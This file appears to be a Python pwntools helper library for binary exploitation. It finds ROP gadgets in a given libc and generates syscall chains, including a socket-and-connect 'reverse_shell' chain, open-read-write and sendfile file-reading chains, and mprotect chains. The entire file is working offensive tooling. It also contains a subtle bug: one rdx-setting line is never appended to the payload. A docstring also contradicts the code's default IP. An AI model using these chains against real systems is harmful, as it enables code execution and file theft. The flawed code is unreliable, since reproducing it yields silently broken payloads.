from os import popen
from pwn import *

class GadgetsDict(dict):
    def __init__(self, libc, ver, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.libc = libc
        self.ver = ver
    
    def __getitem__(self, key):
        if key not in self:
            self[key] = self._handle_missing_key(key)
        return super().__getitem__(key)
    
    def _handle_missing_key(self, key):
        gadgets = {
            'pop_rdi': b'_\xc3',
            'pop_rsi': b'^\xc3',
            'pop_rdx': b'Z\xc3',
            'pop_rax': b'X\xc3',
            'pop_r10': b'AZ\xc3',
            'pop_r8': b'AX\xc3',
            'pop_r9': b'AY\xc3',
            'pop_rcx': b'Y\xc3',
            'syscall': b'\x0f\x05\xc3',
            'leave_ret': b'\xc9\xc3',
            'ret': b'\xc3',
            '/bin/sh': b'/bin/sh\x00',
            '/bin/sh\x00': b'/bin/sh\x00',
            'sh': b'sh\x00',
            'sh\x00': b'sh\x00'
        }

        if key == 'pop_rdx_2':
            try:
                return next(self.libc.search(b'Z[\xc3', executable=True))
            except StopIteration:
                try:
                    return next(self.libc.search(b'ZA\\\xc3', executable=True))
                except StopIteration:
                    print(f'\033[31m[x] Gadgets ({key} ; ret) NOT FOUND. [X]\033[0m')
                    exit(0)

        if key == 'setcontext' or key == 'magic_gadget':
            if '2.27' in self.ver or '2.26' in self.ver or '2.25' in self.ver or '2.24' in self.ver or '2.23' in self.ver:
                try:
                    if key == 'setcontext':
                        return next(self.libc.search(b'H\x8b\xa7\xa0\x00\x00\x00H\x8b\x9f\x80\x00\x00\x00', executable=True))
                except StopIteration:
                    print('\033[31m[x] Gadgets (setcontext) NOT FOUND. [X]\033[0m')
                    exit(0)
            elif '2.29' in self.ver:
                try:
                    if key == 'setcontext':
                        return next(self.libc.search(b'H\x8b\xa2\xa0\x00\x00\x00H\x8b\x9a\x80\x00\x00\x00', executable=True))
                    elif key == 'magic_gadget':
                        return next(self.libc.search(b'H\x8bW\x08H\x8b\x07H\x89\xd7\xff\xe0', executable=True))
                except StopIteration:
                    print(f'\033[31m[x] Gadgets ({key}) NOT FOUND. [X]\033[0m')
                    exit(0)
            else:
                try:
                    if key == 'setcontext':
                        return next(self.libc.search(b'H\x8b\xa2\xa0\x00\x00\x00H\x8b\x9a\x80\x00\x00\x00', executable=True))
                    elif key == 'magic_gadget':
                        return next(self.libc.search(b'H\x8bW\x08H\x89\x04$\xffR ', executable=True))
                except StopIteration:
                    print(f'\033[31m[x] Gadgets ({key}) NOT FOUND. [X]\033[0m')
                    exit(0)

        if key in gadgets:
            try:
                if '/bin/sh' in key:
                    return next(self.libc.search(gadgets[key]))
                return next(self.libc.search(gadgets[key], executable=True))
            except StopIteration:
                if key == 'pop_rdx':
                    print('\033[33m[!] You may try to access pop_rdx_2 instead. [!]\033[0m')
                print(f'\033[31m[x] Gadgets ({key} ) NOT FOUND. [X]\033[0m')
                exit(0)
        else:
            print(f'\033[31m[x] Unsupported gadget key: {key}. [X]\033[0m')
            exit(0)

class GadgetsFinder:
    def __init__(self, libc:ELF):
        '''
        传入一个参数，即libc对象
        '''
        self.libc = libc
        self.libcpath = libc.path
        self.ver = self.__get_ver(self.libcpath)
        self.__gadgets = GadgetsDict(self.libc, self.ver)
    
    def __get_ver(self, filename):
        data = popen(f'strings "{filename}" | grep "GNU C Library"').read()
        try:
            ver = re.search(r'GLIBC (.*?)\)', data).group(1)
        except:
            print('[x] Cannot find GLIBC version! [x]')
            exit(0)
        return ver
    
    def __judge_rdx(self):
        try:
            _ = next(self.libc.search(b'Z\xc3', executable=True))
        except StopIteration:
            return 0
        return 1
    
    def get_gadgets(self) -> GadgetsDict:
        '''
        返回一个gadgets字典，使用如下方式调用：
        gadgets['pop_rdi']
        gadgets['leave_ret']
        ...
        '''
        return self.__gadgets

    def syscall(self, rax, rdi='-', rsi='-', rdx='-'):
        '''
        返回一个指定syscall的payload。
        rax必选，其他参数可选
        '''
        judge_rdx = self.__judge_rdx()
        gadgets = self.__gadgets
        payload = b''
        payload += p64(gadgets['pop_rax']) + p64(rax)
        if rdi != '-':
            payload += p64(gadgets['pop_rdi']) + p64(rdi)
        if rsi != '-':
            payload += p64(gadgets['pop_rsi']) + p64(rsi)
        if rdx != '-':
            if judge_rdx:
                payload += p64(gadgets['pop_rdx']) + p64(rdx)
            else:
                payload += p64(gadgets['pop_rdx_2']) + p64(rdx) + p64(0)
        payload += p64(gadgets['syscall'])
        return payload
    
    def __socket(self, domain=2, type=1, protocol=0):
        return self.syscall(constants.SYS_socket, domain, type, protocol)
    
    def __connect(self, sockaddr, sockfd=3, addrlen=0x10):
        return self.syscall(constants.SYS_connect, sockfd, sockaddr, addrlen)
    
    def reverse_shell(self, sockaddr, sockfd=3, domain=2, type=1, protocol=0):
        
        payload = b''
        payload += self.__socket(domain, type, protocol)
        payload += self.__connect(sockaddr, sockfd=sockfd, addrlen=0x10)
        return payload
    
    def get_sockaddr_payload(self, ip='127.0.0.1', port=9999):
        '''
        返回一个sockaddr的payload，用于reverse_shell。
        ip可选，默认127.0.0.7
        port可选，默认9999
        '''
        ip_list = ip.split('.')
        ip_address = 0
        for i in ip_list:
            ip_address *= 0x100
            ip_address += int(i)
        payload = b''
        payload += p16(2) + p16(port, endianness='big')
        payload += p32(ip_address, endianness='big') + p64(0)
        return payload
    
    def read(self, address, length=0x10, fd=0):
        '''
        通过系统调用read向指定地址写入数据。
        address：指定地址，必填
        length：可选，默认长度0x10
        fd：可选，默认从标准输入读入
        '''
        return self.syscall(constants.SYS_read, fd, address, length)
    
    def write(self, address, length=0x10, fd=1):
        return self.syscall(constants.SYS_write, fd, address, length)

    def __open_payload(self, file_address, type):
        rdx = self.__judge_rdx()
        gadgets = self.__gadgets
        payload = b''
        payload += p64(gadgets['pop_rdi']) + p64(file_address) + p64(gadgets['pop_rax']) + p64(2)
        if type == 'standard':
            payload += p64(gadgets['pop_rsi']) + p64(0)
            if rdx:
                payload += p64(gadgets['pop_rdx']) + p64(0)
            else:
                payload += p64(gadgets['pop_rdx_2']) + p64(0) + p64(0)
        payload += p64(gadgets['syscall'])
        return payload

    def __sendfile(self, fd=3, r10='-'):
        rdi = 1
        rsi = fd
        rdx = 0
        judge_rdx = self.__judge_rdx()
        gadgets = self.__gadgets
        payload = b''
        payload += p64(gadgets['pop_rdi']) + p64(rdi)
        payload += p64(gadgets['pop_rsi']) + p64(rsi)
        if judge_rdx:
            payload += p64(gadgets['pop_rdx']) + p64(rdx)
        else:
            payload += p64(gadgets['pop_rdx_2']) + p64(rdx) + p64(0)

        if r10 != '-':
            try:
                mov_r10_rcx_moveax_0x28_syscall = next(self.libc.search(b'I\x89\xca\xb8(\x00\x00\x00\x0f\x05'))
            except StopIteration:
                print(f'\033[31m[x] This libc do not support r10-control. [X]\033[0m')
                exit(0)
            payload += p64(gadgets['pop_rcx']) + p64(r10)
            payload += p64(mov_r10_rcx_moveax_0x28_syscall)
        else:
            payload += p64(gadgets['pop_rax']) + p64(40)
        return payload
    
    def mprotect(self, rdi, rsi, rdx):
        return self.syscall(constants.SYS_mprotect, rdi, rsi, rdx)

    def ropchain(self, file_address, file_fd=3, type='standard', orw='orw', open='open') -> bytes:
        '''
        返回orw的ropchain。
        file_address: 文件名的存放地址
        file_fd: 欲读取文件的fd
        type: 'short'为短payload，standard为标准payload
        orw: 'orw'使用open+read+write，'sendfile'使用open+sendfile
        open: 'open'使用open系统调用，'openat'使用open函数
        return: 返回一个payload字节串
        '''
        rdx = self.__judge_rdx()
        gadgets = self.__gadgets

        if orw == 'orw':
            payload = b''

            # open
            payload += self.__open_payload(file_address, type=type)

            # read
            payload += p64(gadgets['pop_rax']) + p64(0) + p64(gadgets['pop_rdi']) + p64(file_fd)
            payload += p64(gadgets['pop_rsi']) + p64(self.libc.address - 0x100) 
            if rdx:
                p64(gadgets['pop_rdx']) + p64(0x100)
            else:
                payload += p64(gadgets['pop_rdx_2']) + p64(0x100) + p64(0)
            payload += p64(gadgets['syscall'])

            # write
            payload += p64(gadgets['pop_rax']) + p64(1) + p64(gadgets['pop_rdi']) + p64(1)
            if type == 'standard':
                payload += p64(gadgets['pop_rsi']) + p64(self.libc.address - 0x100)
                if rdx:
                    payload += p64(gadgets['pop_rdx']) + p64(0x100)
                else:
                    payload += p64(gadgets['pop_rdx_2']) + p64(0x100) + p64(0)
            payload += p64(gadgets['syscall'])
            return payload
        elif orw == 'sendfile':
            payload = b''

            # open
            payload += self.__open_payload(file_address, type=type)

            # sendfile
            payload += self.__sendfile(file_fd, r10=0x100)
            return payload
        else:
            print(f'\033[31m[x] The author has not implemented the methods but orw yet. [X]\033[0m')
            exit(0)

